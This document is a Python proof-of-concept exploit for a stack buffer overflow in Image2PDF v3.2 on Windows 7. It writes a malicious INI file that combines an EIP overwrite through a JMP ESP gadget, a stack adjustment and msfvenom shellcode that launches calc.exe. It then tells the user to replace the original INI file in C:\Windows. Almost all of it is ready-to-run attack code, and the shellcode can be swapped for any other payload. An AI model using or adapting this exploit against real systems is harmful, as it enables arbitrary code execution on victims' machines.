# Image2PDF v3.2
# Buffer overflow PoC 
# Tested: Win 7 x86
# Reference: original exploit by  Robbie Corley
# https://www.exploit-db.com/exploits/38423/

FILE = 'Image2PDF.INI'

MAXBUFFRSIZE = 2800
EIPCONTROL = 1944

# Buffer
fill1 = 'A' * EIPCONTROL 

# JMP ESP
eip='\xC3\xD9\xCA\x64'; #JMP ESP @ \x64CAD9C3 from IMGEDIT.OCX (No DEP, No Rebase, No ASLR)

# Adjust esp-1500
movesp = '\x81\xc4\x24\xfa\xff\xff'

# msfvenom -p windows/exec cmd="calc.exe" -f python -b '\x00\x0a\x0d\x20' -s 626
buf =  ""
buf += "\xda\xc6\xd9\x74\x24\xf4\x5b\xb8\xb6\x69\x96\xd7\x29"
buf += "\xc9\xb1\x31\x31\x43\x18\x83\xc3\x04\x03\x43\xa2\x8b"
buf += "\x63\x2b\x22\xc9\x8c\xd4\xb2\xae\x05\x31\x83\xee\x72"
buf += "\x31\xb3\xde\xf1\x17\x3f\x94\x54\x8c\xb4\xd8\x70\xa3"
buf += "\x7d\x56\xa7\x8a\x7e\xcb\x9b\x8d\xfc\x16\xc8\x6d\x3d"
buf += "\xd9\x1d\x6f\x7a\x04\xef\x3d\xd3\x42\x42\xd2\x50\x1e"
buf += "\x5f\x59\x2a\x8e\xe7\xbe\xfa\xb1\xc6\x10\x71\xe8\xc8"
buf += "\x93\x56\x80\x40\x8c\xbb\xad\x1b\x27\x0f\x59\x9a\xe1"
buf += "\x5e\xa2\x31\xcc\x6f\x51\x4b\x08\x57\x8a\x3e\x60\xa4"
buf += "\x37\x39\xb7\xd7\xe3\xcc\x2c\x7f\x67\x76\x89\x7e\xa4"
buf += "\xe1\x5a\x8c\x01\x65\x04\x90\x94\xaa\x3e\xac\x1d\x4d"
buf += "\x91\x25\x65\x6a\x35\x6e\x3d\x13\x6c\xca\x90\x2c\x6e"
buf += "\xb5\x4d\x89\xe4\x5b\x99\xa0\xa6\x31\x5c\x36\xdd\x77"
buf += "\x5e\x48\xde\x27\x37\x79\x55\xa8\x40\x86\xbc\x8d\xbf"
buf += "\xcc\x9d\xa7\x57\x89\x77\xfa\x35\x2a\xa2\x38\x40\xa9"
buf += "\x47\xc0\xb7\xb1\x2d\xc5\xfc\x75\xdd\xb7\x6d\x10\xe1"
buf += "\x64\x8d\x31\x82\xeb\x1d\xd9\x6b\x8e\xa5\x78\x74"

fill2 = '\x90' * (MAXBUFFRSIZE - len(eip) - len(fill1) - len(buf) - len(movesp))

buffer = fill1 + eip + movesp + buf + fill2

ini = """[SaveMode] 
m_iMakePDFMode=0
m_iSaveMode=0
m_szFilenameORPath=
m_iDestinationMode=0
m_bAscFilename=0
m_strFileNumber=0001
[BaseSettingDlg]
m_bCheckDespeckle=0
m_bCheckSkewCorrect=0
m_bCheckView=0
m_szDPI=default
m_bCheckBWImage=1
[SetPDFInfo]
m_szAuthor=
m_szSubject=
m_szTitle="""

ini = ini + buffer

print ('Creating %s file...' % FILE)
f = open(FILE,'w')
f.write(ini)
f.close()

print ('Overwrite the original %s in C:\Windows folder with the evil one' % FILE)
 